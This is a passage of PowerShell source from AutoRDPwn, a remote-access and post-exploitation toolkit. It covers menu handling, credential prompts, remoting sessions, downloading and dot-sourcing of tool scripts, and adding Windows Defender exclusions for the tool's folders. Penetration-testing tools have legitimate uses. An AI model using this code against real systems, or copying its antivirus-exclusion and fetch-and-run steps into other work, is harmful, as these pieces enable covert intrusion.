            if ($i -eq $index) { Write-ARBoxLine $line $boxWidth 'Black' 'Cyan' }
            else { Write-ARBoxLine $line $boxWidth 'White' }
        }
        Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
        Write-ARBoxLine ' Up/Down move   Enter select   Esc cancel' $boxWidth 'DarkGray'
        Write-ARBoxBorder $boxWidth
        if ($script:ARTestMode) { return '' }
        try { $key = [Console]::ReadKey($true) } catch { return '' }
        switch ($key.Key) {
            'UpArrow' {
                $index--
                if ($index -lt 0) { $index = $languages.Count - 1 }
            }
            'DownArrow' {
                $index++
                if ($index -ge $languages.Count) { $index = 0 }
            }
            'Enter' {
                $script:ARLocaleName = $languages[$index]
                Set-ARLastLanguage $languages[$index]
                return $languages[$index]
            }
            'Escape' { return '' }
            default {
                $character = $key.KeyChar.ToString().ToUpperInvariant()
                if ($character -eq 'Q') { return '' }
                if ($character -match '^[1-7]$') {
                    $languageIndex = [int]::Parse($character) - 1
                    $script:ARLocaleName = $languages[$languageIndex]
                    Set-ARLastLanguage $languages[$languageIndex]
                    return $languages[$languageIndex]
                }
            }
        }
    }
}

function Show-ARTui {
    param([string]$InitialId = '')

    if (-not [string]::IsNullOrWhiteSpace($InitialId)) {
        $action = Get-ARActionById $InitialId
        if ($null -ne $action) {
            $script:ARSelectedId = $action.Id
            $script:ARTuiLevel = 'actions'
        }
    }
    $script:ARScroll = 0
    $script:ARCategoryScroll = 0
    if (-not $script:ARTestMode) {
        try { [Console]::CursorVisible = $false } catch { }
    }
    try {
        while ($true) {
            Show-ARTuiScreen
            if ($script:ARTestMode) { return 'TEST' }
            $key = $null
            if ($null -ne $script:ARPendingKey) {
                $key = $script:ARPendingKey
                $script:ARPendingKey = $null
            }
            else {
                try { $key = [Console]::ReadKey($true) } catch { return 'QUIT' }
            }
            if ($null -eq $key) { continue }

            if ($key.Key -eq 'UpArrow') {
                Move-ARTuiSelection -Delta -1
                continue
            }
            if ($key.Key -eq 'DownArrow') {
                Move-ARTuiSelection -Delta 1
                continue
            }
            if ($key.Key -eq 'PageUp') {
                Move-ARTuiSelection -Delta -1 -Page
                continue
            }
            if ($key.Key -eq 'PageDown') {
                Move-ARTuiSelection -Delta 1 -Page
                continue
            }
            if ($key.Key -eq 'Home') {
                Set-ARTuiSelectionEdge
                continue
            }
            if ($key.Key -eq 'End') {
                Set-ARTuiSelectionEdge -Last
                continue
            }
            if ($key.Key -eq 'RightArrow') {
                if ($script:ARTuiLevel -eq 'categories') {
                    $category = Get-ARCurrentCategory
                    if ($null -ne $category) { Enter-ARTuiCategory -Key $category.Key }
                }
                continue
            }
            if ($key.Key -eq 'LeftArrow') {
                Step-ARTuiBack
                continue
            }
            if ($key.Key -eq 'Enter') {
                if ($script:ARTuiLevel -eq 'categories') {
                    $category = Get-ARCurrentCategory
                    if ($null -ne $category) { Enter-ARTuiCategory -Key $category.Key }
                    continue
                }
                $action = Get-ARCurrentAction
                if ($null -ne $action) {
                    $script:ARSelectedId = $action.Id
                    return ('ACTION:' + $action.Id)
                }
                Set-ARStatus (Get-ARText 'txt150' 'No item matches the current filter') 'Warn'
                continue
            }
            if ($key.Key -eq 'Escape' -or $key.Key -eq 'Backspace') {
                Step-ARTuiBack
                continue
            }
            if ($key.Key -eq 'F1') {
                Show-ARHelp -Level $script:ARTuiLevel -CategoryTitle (Get-ARCategoryLabel)
                continue
            }

            $character = $key.KeyChar.ToString().ToUpperInvariant()
            if ($character -eq 'Q' -or $character -eq 'X') { return 'QUIT' }
            if ($character -eq 'L') { return 'LANGUAGE' }
            if ($character -eq 'T') {
                if (Show-ARTargetForm) { Set-ARStatus 'Target updated' 'Ok' }
                continue
            }
            if ($character -eq 'P') { $null = Show-ARTargetPicker; continue }
            if ($character -eq 'S') { $null = Save-ARCurrentTarget; continue }
            if ($character -eq 'B') { Step-ARTuiBack; continue }
            if ($character -eq 'F') {
                if ($script:ARTuiLevel -eq 'actions') {
                    $current = Get-ARCurrentAction
                    if ($null -ne $current) { $null = Toggle-ARFavorite -Id ([string]$current.Id) }
                }
                continue
            }
            if ($character -eq 'R') {
                if ($script:ARFilter -ne '') {
                    $script:ARFilter = ''
                    $script:ARFilterStore[$script:ARTuiLevel] = ''
                    Set-ARStatus (Get-ARText 'txt154' 'Filter cleared') 'Info'
                }
                continue
            }
            if ($character -eq '/') {
                $previous = $script:ARFilter
                $maxLength = [Math]::Max(8, (Get-ARConsoleWidth) - 24)
                Show-ARTuiScreen -Prompt 'filter'
                $typed = Read-ARTuiInlineInput -Row $script:ARTuiPromptRow -Column 10 -Initial $previous -MaxLength $maxLength -OnChange {
                    param($value)
                    $script:ARFilter = [string]$value
                    Sync-ARTuiFilterSelection
                    Show-ARTuiScreen -Prompt 'filter'
                }
                if ($null -eq $typed) {
                    $script:ARFilter = ''
                    $script:ARFilterStore[$script:ARTuiLevel] = ''
                    Set-ARStatus (Get-ARText 'txt154' 'Filter cleared') 'Info'
                }
                else {
                    $script:ARFilter = [string]$typed
                    $script:ARFilterStore[$script:ARTuiLevel] = $script:ARFilter
                    Sync-ARTuiFilterSelection
                    if ($script:ARFilter -eq '') {
                        Set-ARStatus (Get-ARText 'txt154' 'Filter cleared') 'Info'
                    }
                    else {
                        Set-ARStatus ((Get-ARText 'txt152' 'Filter applied') + ': ' + $script:ARFilter) 'Info'
                    }
                }
                continue
            }
            if ($key.KeyChar -match '^\d$') {
                $digits = Read-ARTuiNumberInput -FirstDigit $key.KeyChar.ToString()
                if (-not (Resolve-ARTuiNumber -Digits $digits)) {
                    Set-ARStatus ((Get-ARText 'txt6' 'Incorrect option, try again') + ': ' + $digits) 'Warn'
                }
                continue
            }
        }
    }
    finally {
        Stop-ARTuiFrame
    }
}

function Show-ARLineCategoryList {
    param([int]$Width = 79)
    $boxWidth = [Math]::Max(40, $Width)
    $categories = @(Get-ARActionCategories)
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left ('AutoRDPwn v' + (Get-ARVersionLabel) + ' - line mode') -Right $script:ARLocaleName -Width $boxWidth -Color 'Yellow'
    Write-ARBoxLine ('Target: {0}  User: {1}  Mode: {2}  Session: {3}' -f $script:ARTarget['Computer'], (Get-ARTargetUserLabel), $script:ARTarget['Mode'], $script:ARSessionState) $boxWidth 'Gray'
    Write-ARBoxRule -Width $boxWidth -Label 'CATEGORIES' -Color 'DarkCyan'
    for ($index = 0; $index -lt $categories.Count; $index++) {
        $category = $categories[$index]
        $count = Format-ARItemCount -Count $category.Actions.Count -Plural (Get-ARText 'txt146' 'actions')
        $prefix = ' {0,2}. ' -f ($index + 1)
        $line = $prefix + (Format-ARLeader -Label ([string]$category.Title) -Right $count -Width ($boxWidth - 4 - $prefix.Length))
        Write-ARBoxLine $line $boxWidth 'White'
    }
    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    Write-ARBoxLine (' Status: ' + [string]$script:ARStatus['Text']) $boxWidth (Get-ARStatusColor)
    Write-ARBoxLine ' [digits] category   [L] language   [T] target   [P] profiles   [S] save   [Q] quit' $boxWidth 'DarkGray'
    Write-ARBoxBorder $boxWidth
}

function Show-ARLineActionList {
    param($Category, [int]$Width = 79)
    $boxWidth = [Math]::Max(40, $Width)
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left ('AutoRDPwn > ' + [string]$Category.Title) -Right $script:ARLocaleName -Width $boxWidth -Color 'Yellow'
    Write-ARBoxLine ('Target: {0}  User: {1}  Mode: {2}' -f $script:ARTarget['Computer'], (Get-ARTargetUserLabel), $script:ARTarget['Mode']) $boxWidth 'Gray'
    Write-ARBoxRule -Width $boxWidth -Label 'ACTIONS' -Color 'DarkCyan'
    $actions = @($Category.Actions)
    for ($index = 0; $index -lt $actions.Count; $index++) {
        $action = $actions[$index]
        Write-ARBoxLine (' {0,2}. [{1,3}] {2}' -f ($index + 1), [string]$action.Id, [string]$action.Title) $boxWidth 'White'
        Write-ARBoxLine ('      ' + [string]$action.Description) $boxWidth 'DarkGray'
    }
    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    Write-ARBoxLine (' Status: ' + [string]$script:ARStatus['Text']) $boxWidth (Get-ARStatusColor)
    Write-ARBoxLine ' [number] run   [B] back   [L] language   [T] target   [P] profiles   [S] save   [Q] quit' $boxWidth 'DarkGray'
    Write-ARBoxBorder $boxWidth
}

function Show-ARLineCatalogDump {
    param([int]$Width = 79)
    $boxWidth = [Math]::Max(40, $Width)
    $categories = @(Get-ARActionCategories)
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left ('AutoRDPwn v' + (Get-ARVersionLabel) + ' - line mode') -Right $script:ARLocaleName -Width $boxWidth -Color 'Yellow'
    Write-ARBoxLine ('Target: {0}  User: {1}  Mode: {2}  Session: {3}' -f $script:ARTarget['Computer'], (Get-ARTargetUserLabel), $script:ARTarget['Mode'], $script:ARSessionState) $boxWidth 'Gray'
    foreach ($category in $categories) {
        Write-ARBoxRule -Width $boxWidth -Label ([string]$category.Title).ToUpperInvariant() -Color 'DarkCyan'
        foreach ($action in $category.Actions) {
            Write-ARBoxLine (' [{0,3}] {1}' -f [string]$action.Id, [string]$action.Title) $boxWidth 'White'
            Write-ARBoxLine ('       ' + [string]$action.Description) $boxWidth 'DarkGray'
        }
    }
    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    $footer = Get-ARText 'txt162' '[L] language  [T] target  [P] profiles  [S] save target  [Q] quit'
    Write-ARBoxLine (' ' + $footer) $boxWidth 'DarkGray'
    Write-ARBoxBorder $boxWidth
}

function Show-ARLineMenu {
    $width = Get-ARConsoleWidth
    $inner = [Math]::Max(40, $width - 1)
    if ($script:ARTestMode) {
        Show-ARLineCatalogDump -Width $inner
        return ''
    }
    $category = Get-ARCategoryByKey $script:ARLineCategoryKey
    while ($true) {
        Clear-ARScreen
        if ($null -eq $category) {
            Show-ARLineCategoryList -Width $inner
            $answer = Read-ARLineValue ' Choose a category:'
            if ($null -eq $answer) { return 'QUIT' }
            $value = $answer.Trim()
            if ($value -eq '') { continue }
            if ($value -match '^\d+$') {
                $categories = @(Get-ARActionCategories)
                $index = 0
                if ([int]::TryParse($value, [ref]$index)) {
                    $index = $index - 1
                    if ($index -ge 0 -and $index -lt $categories.Count) {
                        $category = $categories[$index]
                        $script:ARLineCategoryKey = $category.Key
                        continue
                    }
                }
            }
            $code = Resolve-ARSelection $value
            if ($code -in @('QUIT', 'TARGET', 'PROFILES', 'SAVE', 'LANGUAGE')) { return $code }
            if ($code -like 'ACTION:*') { return $code }
            Set-ARStatus ((Get-ARText 'txt6' 'Incorrect option, try again') + ': ' + $value) 'Warn'
            continue
        }

        Show-ARLineActionList -Category $category -Width $inner
        $answer = Read-ARLineValue ' Choose an action:'
        if ($null -eq $answer) { return 'QUIT' }
        $value = $answer.Trim()
        if ($value -eq '') { continue }
        $upper = $value.ToUpperInvariant()
        if ($upper -in @('B', 'BACK', '..')) {
            $category = $null
            $script:ARLineCategoryKey = ''
            continue
        }
        if ($value -match '^\d+$') {
            $actions = @($category.Actions)
            $index = 0
            if ([int]::TryParse($value, [ref]$index)) {
                $index = $index - 1
                if ($index -ge 0 -and $index -lt $actions.Count) {
                    $script:ARLineCategoryKey = $category.Key
                    return ('ACTION:' + $actions[$index].Id)
                }
            }
        }
        $code = Resolve-ARSelection $value
        if ($code -in @('QUIT', 'TARGET', 'PROFILES', 'SAVE', 'LANGUAGE')) { return $code }
        if ($code -like 'ACTION:*') {
            $script:ARLineCategoryKey = $category.Key
            return $code
        }
        Set-ARStatus ((Get-ARText 'txt6' 'Incorrect option, try again') + ': ' + $value) 'Warn'
    }
}

function Show-ARLineTargetForm {
    Clear-ARScreen
    Write-ARLine 'Target editor (line mode)' 'Yellow'
    Read-ARLineTargetForm
    Set-ARStatus 'Target updated' 'Ok'
}

function Show-ARLineTargetPicker {
    $profiles = @(Get-ARTargetProfiles)
    if ($profiles.Count -eq 0) {
        Write-ARWarn (Get-ARText 'txt132' 'No saved targets. Edit a target and press S to save it.')
        return $false
    }
    Clear-ARScreen
    Write-ARLine (Get-ARText 'txt136' 'Saved target profiles') 'Yellow'
    Write-ARLine ('-' * ((Get-ARConsoleWidth) - 1)) 'DarkGray'
    for ($index = 0; $index -lt $profiles.Count; $index++) {
        $profile = $profiles[$index]
        $name = [string]$profile.Name
        if ([string]::IsNullOrWhiteSpace($name)) { $name = '(unnamed)' }
        Write-ARLine (' {0}. {1}  [{2}]' -f ($index + 1), $name, $profile.Computer) 'Gray'
    }
    Write-ARLine ('-' * ((Get-ARConsoleWidth) - 1)) 'DarkGray'
    $choice = Read-ARValue ('Target profile (1-' + $profiles.Count + ')') '1'
    $selectedIndex = 0
    if (-not [int]::TryParse($choice, [ref]$selectedIndex)) {
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
        return $false
    }
    $selectedIndex = $selectedIndex - 1
    if ($selectedIndex -lt 0 -or $selectedIndex -ge $profiles.Count) {
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
        return $false
    }
    $null = Apply-ARTargetProfile $profiles[$selectedIndex]
    Set-ARStatus ((Get-ARText 'txt134' 'Target loaded') + ': ' + [string]$profiles[$selectedIndex].Name) 'Ok'
    return $true
}

$script:ARSession = $null
$script:AROverrideCredential = $null
$script:ARDefenderAvailable = $false
$script:ARDefenderAddedPaths = New-Object System.Collections.Generic.List[string]
$script:ARWorkDirs = New-Object System.Collections.Generic.List[string]
$script:ARTemporaryFiles = New-Object System.Collections.Generic.List[string]
$script:ARRemoteTempDirs = New-Object System.Collections.Generic.List[string]
$script:ARHashUserName = ''
$script:ARCreatedAccounts = New-Object System.Collections.Generic.List[string]
$script:ARRemoteTasks = New-Object System.Collections.Generic.List[string]
$script:ARFirewallRules = New-Object System.Collections.Generic.List[string]
$script:ARCmdKeyTargets = New-Object System.Collections.Generic.List[string]
$script:ARCleanupDone = $false
$script:ARLastFailure = ''
$script:ARRegistryBackup = New-Object System.Collections.Generic.List[object]
$script:ARInstalledProducts = New-Object System.Collections.Generic.List[string]
if (-not (Get-Variable -Name ARAssumeYes -Scope Script -ErrorAction SilentlyContinue)) { $script:ARAssumeYes = $false }
if (-not (Get-Variable -Name ARFirewallRestore -Scope Script -ErrorAction SilentlyContinue)) { $script:ARFirewallRestore = New-Object System.Collections.Generic.List[object] }
if (-not (Get-Variable -Name ARRemoteDefenderChanges -Scope Script -ErrorAction SilentlyContinue)) { $script:ARRemoteDefenderChanges = New-Object System.Collections.Generic.List[object] }

function Invoke-ARDownload {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$OutFile
    )
    $oldProgress = $ProgressPreference
    $ProgressPreference = 'SilentlyContinue'
    try {
        Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
    }
    catch {
        try { (New-Object Net.WebClient).DownloadFile($Url, $OutFile) }
        catch { throw "Download failed: $Url" }
    }
    finally { $ProgressPreference = $oldProgress }
    if (-not (Test-Path -LiteralPath $OutFile)) { throw "Download failed: $Url" }
}

function Get-ARResourcePath {
    param([Parameter(Mandatory = $true)][string]$RelativePath)
    $normalized = $RelativePath -replace '/', '\'
    $localPath = Join-Path $script:ARRoot $normalized
    if (Test-Path -LiteralPath $localPath) { return $localPath }
    # Fail closed: a missing resource is a broken install, not a reason to pull
    # code from the network and dot-source it with administrator rights.
    if ($env:AUTORD_PWN_ALLOW_DOWNLOAD -ne '1') {
        throw ('Missing resource: ' + $localPath + '. Restore it from the repository (set AUTORD_PWN_ALLOW_DOWNLOAD=1 to fetch it from ' + $script:ARRepository + ').')
    }
    $parent = Split-Path -Parent $localPath
    if (-not (Test-Path -LiteralPath $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
    $url = $script:ARRepository + '/' + ($normalized -replace '\\', '/')
    Invoke-ARDownload -Url $url -OutFile $localPath
    return $localPath
}

function Import-ARToolScript {
    param([Parameter(Mandatory = $true)][string]$RelativePath)
    $path = Get-ARResourcePath $RelativePath
    $before = @(Get-ChildItem -LiteralPath $script:ARTools -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
    Push-Location $script:ARTools
    try { . $path }
    finally { Pop-Location }
    $after = @(Get-ChildItem -LiteralPath $script:ARTools -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
    foreach ($file in $after) {
        if ($before -notcontains $file) { $script:ARTemporaryFiles.Add($file) }
    }
}

function Resolve-ARLanguageName {
    param([string]$Name = '')
    $map = @{
        '1' = 'English'; '2' = 'Spanish'; '3' = 'French'; '4' = 'German'
        '5' = 'Italian'; '6' = 'Russian'; '7' = 'Portuguese'
        'en' = 'English'; 'es' = 'Spanish'; 'fr' = 'French'; 'de' = 'German'
        'it' = 'Italian'; 'ru' = 'Russian'; 'pt' = 'Portuguese'
        'english' = 'English'; 'spanish' = 'Spanish'; 'french' = 'French'; 'german' = 'German'
        'italian' = 'Italian'; 'russian' = 'Russian'; 'portuguese' = 'Portuguese'
    }
    if ([string]::IsNullOrWhiteSpace($Name)) {
        $culture = ''
        try { $culture = (Get-Culture).TwoLetterISOLanguageName.ToLowerInvariant() } catch { }
        if ($map.ContainsKey($culture)) { return $map[$culture] }
        return 'English'
    }
    $key = $Name.Trim().ToLowerInvariant()
    if ($map.ContainsKey($key)) { return $map[$key] }
    if ($key.Length -ge 2 -and $map.ContainsKey($key.Substring(0, 2))) { return $map[$key.Substring(0, 2)] }
    return 'English'
}

function Initialize-ARLanguage {
    param([string]$Name = '')
    $resolved = Resolve-ARLanguageName $Name
    $englishPath = Get-ARResourcePath 'Resources\Languages\English.ps1'
    Import-ARLanguage -Path $englishPath -AsFallback
    Import-ARLanguage -Path $englishPath
    if ($resolved -ne 'English') {
        try {
            $languagePath = Get-ARResourcePath ('Resources\Languages\' + $resolved + '.ps1')
            Import-ARLanguage -Path $languagePath
        }
        catch {
            $resolved = 'English'
        }
    }
    Set-ARLanguageName $resolved
    if (Get-Command Reset-ARActionCatalogCache -ErrorAction SilentlyContinue) {
        Reset-ARActionCatalogCache
    }
}

function Get-ARLocalIPv4 {
    param([string]$Target = '')
    if (-not [string]::IsNullOrWhiteSpace($Target) -and $Target -notin @('localhost', '127.0.0.1', '::1', '.')) {
        try {
            $best = Find-NetRoute -RemoteIPAddress $Target -ErrorAction Stop | Select-Object -First 1
            if ($best -and $best.IPAddress -and $best.IPAddress -notlike '169.254.*') {
                return [string]$best.IPAddress
            }
        }
        catch { }
    }
    try {
        $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction Stop |
            Sort-Object RouteMetric, InterfaceMetric |
            Select-Object -First 1
        if ($route) {
            $address = Get-NetIPAddress -InterfaceIndex $route.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike '169.254.*' } |
                Select-Object -First 1
            if ($address) { return [string]$address.IPAddress }
        }
    }
    catch { }
    try {
        $virtual = 'vEthernet|VPN|TAP|ZeroTier|Loopback|Bluetooth|OpenVPN|WireGuard|Hyper-V|Pseudo'
        $address = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
            Where-Object { $_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -notlike '169.254.*' } |
            Sort-Object { if ($_.InterfaceAlias -match $virtual) { 1 } else { 0 } } |
            Select-Object -First 1
        if ($address) { return [string]$address.IPAddress }
    }
    catch { }
    return ''
}

function Test-ARPort {
    param(
        [Parameter(Mandatory = $true)][string]$Computer,
        [Parameter(Mandatory = $true)][int]$Port,
        [int]$TimeoutMs = 2000
    )
    if ([string]::IsNullOrWhiteSpace($Computer)) { return $false }
    if ($Computer -in @('localhost', '127.0.0.1', '::1', '.')) { return $true }
    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Computer, $Port, $null, $null)
        if (-not $async.AsyncWaitHandle.WaitOne($TimeoutMs, $false)) { return $false }
        $client.EndConnect($async)
        return $true
    }
    catch { return $false }
    finally { $client.Close() }
}

function Assert-ARPort {
    param(
        [Parameter(Mandatory = $true)][string]$Computer,
        [Parameter(Mandatory = $true)][int]$Port,
        [string]$Purpose = 'This action'
    )
    if (Test-ARPort -Computer $Computer -Port $Port) { return }
    throw ($Purpose + ' needs TCP ' + $Port + ' on ' + $Computer + ' and it is closed or filtered.')
}

function Initialize-ARDefender {    $script:ARDefenderAddedPaths.Clear()
    try {
        $preference = Get-MpPreference -ErrorAction Stop
    }
    catch { return }
    $script:ARDefenderAvailable = $true
    $existingPaths = @($preference.ExclusionPath | Where-Object { $_ })
    $paths = @($script:ARRoot, $script:ARTools, (Join-Path $env:TEMP 'AutoRDPwn'))
    foreach ($path in $paths) {
        if ([string]::IsNullOrWhiteSpace($path)) { continue }
        if (-not (Test-Path -LiteralPath $path)) { continue }
        if ($existingPaths -contains $path) { continue }
        try {
            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
            $script:ARDefenderAddedPaths.Add($path)
        } catch { }
    }
}

function Restore-ARDefender {
    if (-not $script:ARDefenderAvailable) { return }
    foreach ($path in $script:ARDefenderAddedPaths.ToArray()) {
        try { Remove-MpPreference -ExclusionPath $path -ErrorAction Stop } catch { }
    }
    $script:ARDefenderAddedPaths.Clear()
}

function Write-ARLog {
    param(
        [Parameter(Mandatory = $true)][string]$Message,
        [ValidateSet('Info', 'Warn', 'Error')][string]$Level = 'Info'
    )
    # A log failure must never take the tool down: worst case is a missing line.
    try {
        $logDirectory = Join-Path $env:LOCALAPPDATA 'AutoRDPwn\logs'
        if (-not (Test-Path -LiteralPath $logDirectory)) { New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null }
        $now = Get-Date
        $logPath = Join-Path $logDirectory ('ardpwn-' + $now.ToString('yyyyMMdd') + '.log')
        if (Test-Path -LiteralPath $logPath) {
            $info = Get-Item -LiteralPath $logPath -ErrorAction SilentlyContinue
            if ($info -and $info.Length -gt 5MB) {
                $archive = Join-Path $logDirectory ('ardpwn-' + $now.ToString('yyyyMMdd') + '-' + $now.ToString('HHmmss') + '.log')
                Move-Item -LiteralPath $logPath -Destination $archive -Force -ErrorAction SilentlyContinue
            }
        }
        Add-Content -LiteralPath $logPath -Value ($now.ToString('yyyy-MM-dd HH:mm:ss') + ' [' + $Level + '] ' + $Message) -Encoding UTF8 -ErrorAction Stop
    }
    catch { }
}

function Write-ARProgress {
    param(
        [Parameter(Mandatory = $true)][string]$Activity,
        [Parameter(Mandatory = $true)][int]$Percent,
        [string]$Status = ''
    )
    if (Get-Variable -Name ARTestMode -Scope Script -ValueOnly -ErrorAction SilentlyContinue) { return }
    $redirected = $false
    try { $redirected = [Console]::IsOutputRedirected } catch { }
    if ($redirected) { return }
    if ($Percent -lt 0) { $Percent = 0 }
    if ($Percent -gt 100) { $Percent = 100 }
    $parameters = @{ Activity = $Activity; PercentComplete = $Percent }
    if ($Status -ne '') { $parameters['Status'] = $Status }
    Write-Progress @parameters
}

function Write-ARInfo { param([string]$Text); Write-ARLog -Message $Text -Level Info; Write-Host ('[i] ' + $Text) -ForegroundColor Green }
function Write-ARSuccess { param([string]$Text); Write-Host ('[+] ' + $Text) -ForegroundColor Blue }
function Write-ARWarn { param([string]$Text); Write-ARLog -Message $Text -Level Warn; Write-Host ('[!] ' + $Text) -ForegroundColor Yellow }
function Write-ARError { param([string]$Text); Write-ARLog -Message $Text -Level Error; Write-Host ('[!] ' + $Text) -ForegroundColor Red }
function Write-ARBlank { Write-Host '' }

function Read-ARValue {
    param([string]$Prompt, [string]$Default = '')
    if ($script:ARInvokedFromOption) {
        throw ('Missing value for "' + $Prompt + '": it cannot be prompted for in -option mode.')
    }
    while ($true) {
        $suffix = ': '
        if ($Default -ne '') { $suffix = ' [' + $Default + ']: ' }
        $value = Read-ARLineValue (' ' + $Prompt + $suffix)
        if ($null -eq $value) { $value = '' }
        $value = $value.Trim()
        if ($value -eq '' -and $Default -ne '') { return $Default }
        if ($value -ne '') { return $value }
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
    }
}

function Read-ARSecret {
    param([string]$Prompt = 'Password')
    if ($script:ARInvokedFromOption) {
        throw ('Missing value for "' + $Prompt + '": it cannot be prompted for in -option mode.')
    }
    while ($true) {
        $value = Read-ARSecretValue (' ' + $Prompt + ': ')
        if ($null -ne $value -and $value -ne '') { return $value }
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
    }
}

function Show-ARText {
    param($Value, [switch]$Copy)
    if ($null -eq $Value) { return }
    $text = ($Value | Out-String).TrimEnd()
    if ($text -eq '') { return }
    Write-Host $text
    # Clipboard is opt-in: results can contain credentials and dumps.
    if ($Copy -and $text.Length -lt 1048576) {
        try { Set-Clipboard -Value $text } catch { }
    }
}

function Test-ARIsLocalTarget {
    $computer = [string]$script:ARTarget['Computer']
    if ([string]::IsNullOrWhiteSpace($computer)) { return $true }
    $names = @('localhost', '127.0.0.1', '::1', '.', $env:COMPUTERNAME)
    try { $names += [System.Net.Dns]::GetHostName() } catch { }
    return ($names -contains $computer)
}

function Get-ARTargetComputer {
    $computer = [string]$script:ARTarget['Computer']
    if ([string]::IsNullOrWhiteSpace($computer)) { return 'localhost' }
    return $computer
}

function Get-ARTargetUserName {
    $user = [string]$script:ARTarget['User']
    $domain = [string]$script:ARTarget['Domain']
    if ($domain -ne '' -and $user -ne '' -and $user -notmatch '\\') { return $domain + '\' + $user }
    return $user
}

function Get-ARPlainPassword {
    $password = [string]$script:ARTarget['Password']
    if ($password -eq '') {
        $password = Read-ARSecret 'Password'
        $script:ARTarget['Password'] = $password
    }
    return $password
}

function Get-ARTargetCredential {
    $user = [string]$script:ARTarget['User']
    if ([string]::IsNullOrWhiteSpace($user)) { return $null }
    $domain = [string]$script:ARTarget['Domain']
    if ($domain -ne '' -and $user -notmatch '\\') { $user = $domain + '\' + $user }
    $password = Get-ARPlainPassword
    $secure = ConvertTo-SecureString -String $password -AsPlainText -Force
    return New-Object System.Management.Automation.PSCredential($user, $secure)
}

function Connect-ARTargetSession {
    param(
        [System.Management.Automation.PSCredential]$Credential = $null,
        [switch]$Force
    )
    $target = Get-ARTargetComputer
    if (-not $Force -and $script:ARSession) {
        $state = ''
        try { $state = [string]$script:ARSession.State } catch { }
        if ($state -eq 'Opened') {
            if ([string]$script:ARSession.ComputerName -eq $target) {
                Set-ARSessionState ('connected (' + $target + ')')
                return $script:ARSession
            }
            Close-ARTargetSession
        }
    }
    if ($null -eq $Credential -and $script:AROverrideCredential) { $Credential = $script:AROverrideCredential }
    if ($null -eq $Credential) { $Credential = Get-ARTargetCredential }
    $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
    if ($Credential) { $parameters['Credential'] = $Credential }
    # Bounded timeouts: an unreachable host must fail in ~15s, not hang for minutes.
    try {
        $parameters['SessionOption'] = New-PSSessionOption -OpenTimeout 15000 -OperationTimeout 180000 -CancelTimeout 5000
    }
    catch { }
    $session = New-PSSession @parameters
    $script:ARSession = $session
    Set-ARSessionState ('connected (' + $target + ')')
    return $session
}

function Close-ARTargetSession {
    if ($script:ARSession) {
        try { Remove-PSSession -Session $script:ARSession -ErrorAction SilentlyContinue } catch { }
        $script:ARSession = $null
    }
    Set-ARSessionState ''
}

function Get-ARTargetSession {
    # Cache contract: hand out the cached session only while it is Opened and
    # still points at the current target; anything else gets dropped and rebuilt.
    $target = Get-ARTargetComputer
    $cached = $script:ARSession
    if ($cached) {
        $state = ''
        $name = ''
        try { $state = [string]$cached.State } catch { }
        try { $name = [string]$cached.ComputerName } catch { }
        if ($state -eq 'Opened' -and ($name -eq '' -or $name -eq $target)) { return $cached }
        try { Remove-PSSession -Session $cached -ErrorAction SilentlyContinue } catch { }
        $script:ARSession = $null
    }
    $lastError = $null
    for ($attempt = 0; $attempt -lt 3; $attempt++) {
        if ($attempt -gt 0) { Start-Sleep -Seconds (2 * $attempt) }
        try {
            $session = Connect-ARTargetSession
            if ($session) {
                $state = ''
                try { $state = [string]$session.State } catch { }
                if ($state -eq 'Opened') { return $session }
            }
        }
        catch { $lastError = $_ }
    }
    if ($lastError) { throw $lastError }
    throw 'Unable to open a PowerShell session to the target.'
}

function Invoke-ARRemote {
    param(
        [Parameter(Mandatory = $true)][scriptblock]$ScriptBlock,
        [object[]]$ArgumentList = @(),
        [int]$Retry = 3,
        [int]$Delay = 2,
        [System.Management.Automation.Runspaces.PSSession]$Session = $null
    )
    if ($null -eq $Session) { $Session = Get-ARTargetSession }
    $attempts = $Retry
    if ($attempts -lt 1) { $attempts = 1 }
    $lastError = $null
    for ($attempt = 1; $attempt -le $attempts; $attempt++) {
        try {
            return Invoke-Command -Session $Session -ScriptBlock $ScriptBlock -ArgumentList $ArgumentList -ErrorAction Stop
        }
        catch {
            $lastError = $_
            $retryable = $false
            if ($_.Exception -is [System.Management.Automation.Runspaces.PSRemotingTransportException]) { $retryable = $true }
            elseif ($_.Exception -is [System.Management.Automation.Runspaces.PSRemotingDataStructureException]) { $retryable = $true }
            elseif ($_.Exception.Message -match 'transport|broken pipe|deadlock|WSMan') { $retryable = $true }
            if (-not $retryable) { throw }
            if ($attempt -ge $attempts) { break }
            Start-Sleep -Seconds ([int]($Delay * [Math]::Pow(2, ($attempt - 1))))
            # One reconnect between attempts, only when the session actually died.
            $state = ''
            try { $state = [string]$Session.State } catch { }
            if ($state -ne 'Opened') {
                try {
                    if ($script:ARSession -eq $Session) { $script:ARSession = $null }
                    Remove-PSSession -Session $Session -ErrorAction SilentlyContinue
                    $Session = Get-ARTargetSession
                }
                catch { }
            }
        }
    }
    throw $lastError
}

function Invoke-ARTargetCommand {
    param(
